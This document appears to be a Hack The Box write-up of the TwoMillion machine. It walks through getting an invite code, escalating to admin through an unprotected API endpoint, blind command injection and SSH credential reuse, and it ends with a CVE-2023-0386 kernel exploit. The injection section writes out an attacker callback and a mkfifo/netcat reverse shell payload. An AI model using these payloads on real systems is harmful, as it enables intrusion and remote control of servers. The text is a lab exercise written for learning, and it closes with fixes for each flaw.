---
title: 'TwoMillion'
target: 'Hack The Box — TwoMillion'
difficulty: 'easy'
date: 2025-09-15
summary: "Nostalgic HTB replica — JavaScript invite code deobfuscation, API enumeration revealing unprotected admin endpoints, blind command injection for shell as www-data, credential reuse from .env for SSH, and CVE-2023-0386 OverlayFS kernel exploit to root."
role: 'pentest'
tags: ['rustscan', 'nmap', 'javascript', 'deobfuscation', 'api', 'feroxbuster', 'idor', 'privilege-escalation', 'command-injection', 'reverse-shell', 'credential-reuse', 'ssh', 'cve-2023-0386', 'overlayfs', 'kernel-exploit']
problem: "Easy Linux box running the old HTB website replica at 2million.htb. Obfuscated JS invite code generator, exposed REST API with unprotected admin settings endpoint, blind command injection in admin VPN generate, credential reuse from .env, and a kernel vulnerable to CVE-2023-0386."
action: "RustScan found SSH (22) and HTTP (80). Deobfuscated the JS invite code generator, called makeInviteCode() to get a ROT13 hint, generated and decoded an invite code to register. Browsed /api/v1 — full route list exposed admin endpoints. PUT to /api/v1/admin/settings/update with is_admin:1 escalated to admin. Blind command injection in /api/v1/admin/vpn/generate confirmed via curl callback, then reverse shell as www-data. Credentials in .env (SuperDuperPass123) reused for SSH as admin. Mail from ch4p hinted at CVE-2023-0386 — compiled and ran the OverlayFS exploit for root."
outcome: "Rooted via JS deobfuscation to register, API-based admin privilege escalation, blind command injection for initial shell, credential reuse for SSH pivot, and CVE-2023-0386 kernel exploit for root."
draft: false
---

## Background

TwoMillion is an easy-rated Linux machine running a nostalgic replica of the old HackTheBox website — the one that required solving a challenge just to register. The attack chain starts with reverse-engineering an obfuscated JavaScript invite code generator, moves through API enumeration that exposes an unprotected admin privilege escalation endpoint, exploits blind command injection in the admin VPN generation feature, pivots through credential reuse to SSH, and finishes with a kernel exploit hinted at in an in-character email from the HTB team. The box is a love letter to the platform's origins and a practical lesson in API security — when every endpoint is documented in a single JSON response and the admin role check is missing from a settings update, the path from guest to admin is a single PUT request.

---

## Enumeration

A RustScan sweep against the target identifies two open ports — 22 (SSH) and 80 (HTTP).

![RustScan output showing rustscan -a 10.10.11.221 --ulimit 5000 -- -sV -A -Pn with the RustScan ASCII art banner, The Modern Day Port Scanner heading, TCP handshake message, config file at /home/kali/.rustscan.toml, automatically increasing ulimit to 5000, Open 10.10.11.221:22 and Open 10.10.11.221:80.](/writeups/htb-twomillion/01-rustscan.png)

The HTTP service redirects to `2million.htb` — the old HackTheBox landing page, complete with the original design. Registration requires an invite code, just like the real platform used to.

---

## Invite code — JavaScript deobfuscation

Inspecting the page source reveals an obfuscated JavaScript invite code generator packed with `eval(function(p,a,c,k,e,d))`. Running it through an [unPacker](https://matthewfl.com/unPacker.html) tool deobfuscates the code:

![JavaScript UnPacker tool by Matthewfl showing the obfuscated eval function pasted into the input field, with visible keywords in the packed code including response, function, log, console, code, dataType, json, POST, formData, ajax, type, url, success, api, v1, invite, error, data, var, verifyInviteCode, makeInviteCode, how, to, generate, verify, split.](/writeups/htb-twomillion/02-unpacker.png)

The deobfuscated code reveals two functions:

```javascript
function verifyInviteCode(code) {
    $.ajax({
        type: "POST", dataType: "json",
        data: { "code": code },
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST", dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}
```

Calling `makeInviteCode()` returns a ROT13-encoded hint:

```
{ data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
```

Decoding: *"In order to generate the invite code, make a POST request to /api/v1/invite/generate"*. POSTing to that endpoint generates a base64-encoded invite code, which decodes to the actual code needed for registration.

---

## API enumeration

After registering and logging in, browsing the application reveals API calls to endpoints under `/api/v1/`. Running feroxbuster against the admin API path to look for additional endpoints:

![Feroxbuster output showing feroxbuster -u http://2million.htb/api/v1/admin -w raft-medium-directories.txt, version 2.10.2, 50 threads, All Status Codes, results showing 301 redirect for /api/v1/admin/ (162 chars, auto-filter created) and 401 GET for http://2million.htb/api/v1/admin/auth, scan completed 30000/30000 with 1 found and 0 errors.](/writeups/htb-twomillion/03-feroxbuster.png)

Feroxbuster finds `/api/v1/admin/auth` returning 401, but not the full picture. Navigating directly to `http://2million.htb/api/v1` returns the complete API documentation in JSON:

![Firefox browser at 2million.htb/api/v1 showing JSON viewer with full API route documentation. v1 section has user endpoints — GET /api/v1 Route List, /api/v1/invite/how/to/generate, /api/v1/invite/generate, /api/v1/invite/verify, /api/v1/user/auth, /api/v1/user/vpn/generate, /api/v1/user/vpn/regenerate, /api/v1/user/vpn/download; POST /api/v1/user/register, /api/v1/user/login. admin section — GET /api/v1/admin/auth Check if user is admin; POST /api/v1/admin/vpn/generate Generate VPN for specific user (highlighted in blue); PUT /api/v1/admin/settings/update Update user settings.](/writeups/htb-twomillion/04-api-docs.png)

The API exposes everything — user registration and login, invite code generation and verification, VPN management, and critically, admin endpoints including `/api/v1/admin/settings/update` (PUT) for updating user settings and `/api/v1/admin/vpn/generate` (POST) for generating VPN configs for specific users.

---

## Admin privilege escalation

The `/api/v1/admin/settings/update` endpoint accepts a PUT request with user settings — and crucially, it does not verify that the caller is already an admin. Sending a PUT with `is_admin` set to 1:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
     --cookie "PHPSESSID=vlq4dnflvs5ebkefdsu3cija6v" \
     --header "Content-Type: application/json" \
     -v --data '{"email":"sarp@sarp.com","is_admin":1}'
```

![Terminal showing curl PUT request to http://2million.htb/api/v1/admin/settings/update with cookie and Content-Type application/json headers, data containing email sarp@sarp.com and is_admin 1. Response shows HTTP/1.1 200 OK, Server nginx, Content-Type application/json, and response body {"id":14,"username":"sarp","is_admin":1}.](/writeups/htb-twomillion/05-admin-privesc.png)

The server accepts the request and returns the updated user object with `"is_admin":1` — vertical privilege escalation from a regular user to admin with a single PUT request. No role validation, no authorization check.

---

## Blind command injection — reverse shell

With admin privileges, the `/api/v1/admin/vpn/generate` endpoint becomes accessible. It accepts a `username` parameter to generate a VPN configuration for a specific user. Testing for command injection with several payload variations:

![Terminal showing three curl POST requests to http://2million.htb/api/v1/admin/vpn/generate with different command injection payloads in the username field — first {"username":"sarp && whoami"}, then {"username":"sarp && whoami"} again, then {"username":"sarp && whoami # "} with a comment character to truncate the rest of the command.](/writeups/htb-twomillion/06-cmdi-attempts.png)

None of these return command output in the response — this is **blind command injection**. Confirming execution by injecting a curl callback to the attacker's HTTP server:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
     --cookie "PHPSESSID=vlq4dnflvs5ebkefdsu3cija6v" \
     --header "Content-Type: application/json" \
     --data '{"username":"sarp && curl 10.10.14.40:8000 # "}'
```

![Split terminal — left side shows the curl POST command to /api/v1/admin/vpn/generate with the curl callback payload in the username field. Right side shows python3 -m http.server running on port 8000 receiving a GET request from 10.10.11.221 (the target machine) with HTTP 200 response, confirming blind command injection is working.](/writeups/htb-twomillion/07-blind-cmdi.png)

The target machine makes the HTTP request back to the attacker's server — command injection confirmed. Upgrading to a full reverse shell:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
     --cookie "PHPSESSID=vlq4dnflvs5ebkefdsu3cija6v" \
     --header "Content-Type: application/json" \
     --data '{"username":"sarp && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 4444 >/tmp/f # "}'
```

![Split terminal — left side shows the curl POST command with the mkfifo reverse shell payload injected in the username field. Right side shows nc -nlvp 4444 catching the connection from 10.10.11.221 port 37672, /bin/sh warning about no job control, then python3 pty.spawn upgrading to a full bash shell as www-data@2million in /html directory.](/writeups/htb-twomillion/08-reverse-shell.png)

Reverse shell as `www-data`. A Python PTY upgrade stabilizes the shell.

---

## Lateral movement — credential reuse from .env

Enumerating the web application files reveals database credentials in the `.env` file:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Since `admin` exists as a system user on the machine, trying the same password on SSH works — credential reuse across the application database and the OS account. The user flag was retrieved.

---

## Privilege escalation — CVE-2023-0386

The `admin` user has no sudo privileges, but a mail file in `/var/mail/admin` from `ch4p` (the HTB Godfather) contains a pointed hint:

```
Hey admin,

I know you're working as fast as you can to do the DB migration. While we're
partially down, can you also upgrade the OS on our web host? There have been a
few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE
looks nasty. We can't get popped by that.

HTB Godfather
```

CVE-2023-0386 is an OverlayFS/FUSE kernel vulnerability that allows local privilege escalation by exploiting how the OverlayFS filesystem handles file copies between layers — specifically, it fails to properly check permissions when copying files from the lower to the upper layer, allowing a FUSE filesystem to inject a setuid binary. Downloading the [exploit](https://github.com/sxlmnwb/CVE-2023-0386) from GitHub, compiling it on the target, and running it grants a root shell. The root flag was retrieved.

---

## What I took from this

TwoMillion's API is a case study in what happens when authorization logic is missing entirely. The `/api/v1/admin/settings/update` endpoint doesn't check whether the caller is already an admin — it accepts the `is_admin` field from any authenticated user and updates the database accordingly. This is a broken access control vulnerability at its most basic: the endpoint exists, it's documented in the API route list (which is itself publicly accessible), and it trusts whatever the client sends. The fix is role validation middleware that rejects requests from non-admin users before the handler ever runs, and removing the API route listing from unauthenticated access.

The blind command injection in the VPN generation endpoint is a reminder that the absence of output doesn't mean the absence of execution. The three failed attempts with `&& whoami` produced no visible output, which might lead a tester to move on — but the curl callback to an attacker-controlled server immediately proved the injection worked. Whenever testing for blind injection, out-of-band confirmation (DNS lookups, HTTP callbacks, time-based delays) should be the standard verification method before dismissing a potential injection point.

The overall chain on TwoMillion — invite code deobfuscation, API privilege escalation, blind command injection, credential reuse, kernel exploit — is five distinct vulnerabilities, each individually addressable. Input validation on the VPN username parameter, role checks on admin endpoints, hashing or not storing plaintext database credentials in `.env`, and keeping the kernel patched would each break a link in the chain. Defense in depth isn't about making any single layer impenetrable; it's about ensuring that when one layer fails, the next one catches it.
